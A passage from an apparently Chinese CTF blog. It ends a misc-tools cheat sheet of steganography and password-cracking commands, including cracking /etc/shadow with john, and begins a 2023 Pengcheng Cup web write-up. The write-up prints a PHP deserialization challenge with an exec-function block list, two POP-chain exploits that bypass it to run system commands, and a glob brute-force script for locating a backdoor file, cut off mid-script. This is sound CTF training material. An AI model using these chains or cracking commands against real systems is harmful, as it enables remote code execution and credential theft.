id="blindwatermark"><strong>BlindWaterMark</strong></h3><p>盲水印提取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python3 bwmforpy3.py decode hui.png hui_with_wm.png wm_from_hui.png<br></code></pre></td></tr></table></figure><h3 id="deepsound">deepsound</h3><p>图形化音频隐写，将文件隐写进音频中</p><p>https://github.com/oneplus-x/DeepSound-2.0http://jpinsoft.net/deepsound/download.aspx</p><h3 id="silenteye"><strong>silenteye</strong></h3><p>图形化图片/音频隐写工具</p><p>https://achorein.github.io/silenteye/download/?i2</p><h3 id="exiftool">exiftool</h3><p>图片信息查看工具</p><p><code>apt-get install exiftool</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exiftool</span> <span class="hljs-number">1</span>.jpg<br></code></pre></td></tr></table></figure><p>用法大全：https://www.rmnof.com/article/exiftool-introduction/</p><h3 id="cloacked-pixel">cloacked-pixel</h3><p>有密码的lsb隐写，集成在puzzlesolver</p><p>单独地址：https://github.com/livz/cloacked-pixel</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python3 lsb.py extract 1.png 1.txt 123456<br></code></pre></td></tr></table></figure><h3 id="snow">SNOW</h3><p>snow隐写（the Steganographic Nature Of Whitespace）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP">加密<br>SNOW.EXE -C -m <span class="hljs-string">&quot;message&quot;</span> -p <span class="hljs-string">&quot;passswd&quot;</span> infile outfile<br>解密<br>SNOW.EXE -C -p <span class="hljs-string">&quot;passwd&quot;</span> infile outfile<br></code></pre></td></tr></table></figure><h3 id="audacity">Audacity</h3><p>图形化，音频隐写</p><h3 id="steganography">steganography</h3><p>PixelJihad，png，可无密码</p><h3 id="wbstego4open">wbStego4open</h3><p>图形化PDF、BMP、 TXT、 HTM隐写，要密码</p><h3 id="pngcheck">pngcheck</h3><p>检查png的idat块</p><p><code>apt-get install pngcheck</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pngcheck</span> -v <span class="hljs-number">1</span>.png<br></code></pre></td></tr></table></figure><h3 id="identify">Identify</h3><p>linux下检查图片信息，主要用于识别gif的帧间隔时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">identify -format <span class="hljs-string">&quot;%s %T \n&quot;</span> 1.gif<br></code></pre></td></tr></table></figure><h3 id="npiet">npiet</h3><p>用位图色块来编写程序，特征为图片的rgb很乱，多彩色部分，png、jpg、gif，无密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP">npiet.exe -tpic <span class="hljs-number">1</span>.png<br></code></pre></td></tr></table></figure><h3 id="dtmf2num">dtmf2num</h3><p>音频拨号隐写，wav</p><p>http://aluigi.altervista.org/mytoolz/dtmf2num.zip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">dtmf2num.exe 1.wav<br></code></pre></td></tr></table></figure><h3 id="mp3stego">MP3stego</h3><p>音频隐写，mp3、aac</p><p>https://www.petitcolas.net/steganography/mp3stego/</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">Decode.exe -X -P 123456 1.WAV<br></code></pre></td></tr></table></figure><h3 id="ntfsstreamseditor">ntfsstreamseditor</h3><p>ntfs流隐写</p><h3 id="qsstv">qsstv</h3><p>linux上的sstv接收软件，特点是可以直接读取wav音频文件里的信息，免去了外放的困扰</p><p><code>apt-get install qsstv</code></p><h2 id="爆破">爆破</h2><h3 id="archpr">ARCHPR</h3><p>rar4/zip等爆破密码</p><h3 id="aopr">AOPR</h3><p>office文档（word、excel、ppt）爆破</p><h3 id="apdfpr">APDFPR</h3><p>pdf爆破</p><h3 id="zip2john">zip2john</h3><p>配合john，zip文件爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment">#1.zip为压缩文件，flag.txt为加密文件</span><br>zip2john 1.zip &gt; flag.txt<br><span class="hljs-comment">#此时flag.txt变为hash值</span><br>john flag.txt<br></code></pre></td></tr></table></figure><h3 id="john">john</h3><p>爆破hash，kail下方便使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">john /etc/shadow --format=crypt<br></code></pre></td></tr></table></figure><h3 id="rarcrack">rarcrack</h3><p>爆破zip/rar/7z，本地生成xml文件，可修改字典以及位数，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment">#1.zip为压缩文件，20位线程数，type可选zip/rar/7z</span><br>rarcrack 1.zip --threads 20 --<span class="hljs-built_in">type</span> zip<br></code></pre></td></tr></table></figure><h3 id="fcrackzip">fcrackzip</h3><p>爆破zip，可指定位数、模式等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment">#1.zip为压缩文件，-l 1-10位数，-c1纯数字，-b暴力破解，-u 使用unzip删除错误</span><br>fcrackzip -v -b -u -l 1-10 -c1 1.zip <br></code></pre></td></tr></table></figure><h3 id="crc32爆破压缩包文件内容">crc32爆破压缩包文件内容</h3><p>小于4字节 CRC32-Tools-1.1</p><p>大于4字节(5-6) crc32.py</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python crc32.py reverse 0x....<br></code></pre></td></tr></table></figure><h3 id="bkcrack">bkcrack</h3><p>明文爆破，需要已知12字节且其中至少8字节连续</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Plain">-c 压缩包里加密的文件（或提取的密文数据）<br>-p 提取的明文部分<br>-x 压缩包内目标文件的偏移地址  部分已知明文值<br>-C 加密压缩包<br>-o offset  <br>-p 参数指定的明文在压缩包内目标文件的偏移量<br>-k 解出的密钥<br><br>bkcrack.exe -C encrypted.zip -c cipher -P plain.zip -p plain<br><br>bkcrack.exe -C encrypted.zip -c decipheredfile -k 12345678 23456789 34567890 -d decipheredfile<br></code></pre></td></tr></table></figure><h2 id="其他">其他</h2><h3 id="cyberchef">CyberChef</h3><p>最强的解码工具</p><p>https://icyberchef.com/</p><h3 id="acropalypse-multi-tool">Acropalypse-Multi-Tool</h3><p>windows截图剪贴板漏洞(aCropalypse)https://github.com/frankthetank-music/Acropalypse-Multi-Tool</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">python gui.py<br></code></pre></td></tr></table></figure><h3 id="git_extract">Git_Extract</h3><p>本地.git恢复</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">python2 /home/ddd/桌面/Git_Extract-master/git_extract.py .git    <br></code></pre></td></tr></table></figure><h3 id="sysdig">sysdig</h3><p>sysdig恢复scap为可读日志文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">sysdig -r charon.scap &gt; <span class="hljs-number">1.</span>txt<br></code></pre></td></tr></table></figure><h3 id="mouse-recorder">Mouse Recorder</h3><p><code>.rsmr</code>文件，鼠标轨迹还原</p><p>https://www.robot-soft.com/</p><h3 id="ffmpeg">ffmpeg</h3><p>分离视频音轨、帧</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ffmpeg</span> -i flag.avi ./%<span class="hljs-number">4</span>d.png<br></code></pre></td></tr></table></figure><h3 id="crass">crass</h3><p>xp3提取器</p><p>https://github.com/chaceli/CTF_WP/blob/master/2018starctf/misc/xp3/wp/xp3%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96%E5%99%A8.7z</p><h3 id="pcapfix">pcapfix</h3><p>pcap文件修复</p><h2 id="参考">参考</h2><p>https://byxs20.github.io/</p><p>https://cloud.tencent.com/developer/article/2069964</p><p>https://www.cnblogs.com/perfsky/p/17739016.html</p>]]></content>
    
    
    <categories>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023鹏城杯</title>
    <link href="/2023/11/06/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/"/>
    <url>/2023/11/06/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="鹏城杯">2023鹏城杯</h1><h1 id="web">WEB</h1><h2 id="web1">web1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exp</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hacker</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;hacker-&gt;name;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$finish</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;finish-&gt;<span class="hljs-title function_ invoke__">hacker</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hacker</span>;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$parms1</span></span>)</span><br><span class="hljs-function">    </span>&#123;   <br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$parms1</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;hacker-&gt;<span class="hljs-title function_ invoke__">welcome</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">welcome</span>();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">welcome</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;welcome~ &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">K</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func,<span class="hljs-string">&#x27;welcome&#x27;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">welcome</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key === <span class="hljs-literal">true</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;finish1-&gt;name) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish) &#123;<br>                <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$this</span>-&gt;method,<span class="hljs-variable">$this</span>-&gt;args);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">nonono</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|system|eval|flag/i&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pop&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">nonono</span>(<span class="hljs-variable">$a</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>非预期</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exp</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">welcome</span>();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">welcome</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;welcome~ &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// pop</span><br><span class="hljs-comment">// H::welcome  $username</span><br><span class="hljs-comment">// Hacker::__toString</span><br><span class="hljs-variable">$aaa</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">H</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hacker</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$aaa</span>));<br></code></pre></td></tr></table></figure><p>预期</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hacker</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$finish</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hacker</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">K</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-literal">true</span>;<br>        @<span class="hljs-variable language_">$this</span>-&gt;finish1-&gt;name = <span class="hljs-literal">true</span>;<br>        @<span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish = <span class="hljs-literal">true</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-string">&#x27;system&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// pop</span><br><span class="hljs-comment">// H::__destruct   $username</span><br><span class="hljs-comment">// A::__toString   $hacker</span><br><span class="hljs-comment">// C::__get        $finish</span><br><span class="hljs-comment">// K::__call       $func</span><br><span class="hljs-comment">// E::__invoke     $hacker</span><br><span class="hljs-comment">// R::welcome</span><br><br><span class="hljs-variable">$aaa</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">H</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username-&gt;hacker = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username-&gt;hacker-&gt;finish = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">K</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username-&gt;hacker-&gt;finish-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">E</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username-&gt;hacker-&gt;finish-&gt;func-&gt;hacker = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">R</span>();<br><br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/system/&quot;</span>, <span class="hljs-string">&quot;syssystemtem&quot;</span>, <span class="hljs-variable">$aaa</span>);<span class="hljs-comment">//用的preg_replace($filter,&#x27;&#x27;,$a);多加一个就行</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-comment">//O%3A1%3A%22H%22%3A1%3A%7Bs%3A8%3A%22username%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A6%3A%22hacker%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A6%3A%22finish%22%3BO%3A1%3A%22K%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A1%3A%22E%22%3A1%3A%7Bs%3A6%3A%22hacker%22%3BO%3A1%3A%22R%22%3A5%3A%7Bs%3A9%3A%22%00R%00method%22%3Bs%3A6%3A%22syssystemtem%22%3Bs%3A7%3A%22%00R%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A3%3A%22key%22%3Bb%3A1%3Bs%3A7%3A%22finish1%22%3BO%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bb%3A1%3B%7Ds%3A6%3A%22finish%22%3BO%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7D%7D%7D%7D%7D%7D</span><br></code></pre></td></tr></table></figure><figure><img src="/img/2023鹏城杯/169923146057815.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="web2">web2</h2><p>前端有个scandir功能，输入目录，如果有此目录返回<code>yesyesyes!!!</code>，没有此目录返回<code>nonono~~~</code></p><p>如下</p><figure><img src="/img/2023鹏城杯/16992314605611.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>前端看到有个后门文件，但是如果单纯爆破文件名要16的16次方，显然不可能</p><figure><img src="/img/2023鹏城杯/16992314605612.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>利用glob协议，匹配地找php，这样最多只要匹配16*16次即可得到文件名</p><figure><img src="/img/2023鹏城杯/16992314605613.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>借用<ahref="https://www.yuque.com/dat0u/ctf/gupiindgyz7vodib#Duoup">lxxxin</a>师傅的wp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs PHP">import requests<br><br>url = <span class="hljs-string">&quot;http://172.10.0.5/&quot;</span><br><br>s = <span class="hljs-string">&quot;0123456789abcdef&quot;</span><br>filename = <span class="hljs-string">&quot;glob:///var/www/html/backdoor_&quot;</span><br><br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j in s:<br>        temp = filename + j + <span class="hljs-string">&quot;*.php&quot;</span><br>        data = &#123;<br>            <span class="hljs-string">&quot;filename&quot;</span>: temp<br>        &#125;<br>        r = requests.<span class="hljs-title function_ invoke__">post</span>(url, data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;yes&quot;</span> in r.text:<br>            filename += j<br>            <span class="hljs-keyword">print</span>(filename + <span class="hljs-string">&quot;.php&quot;</span>)<br>            <span 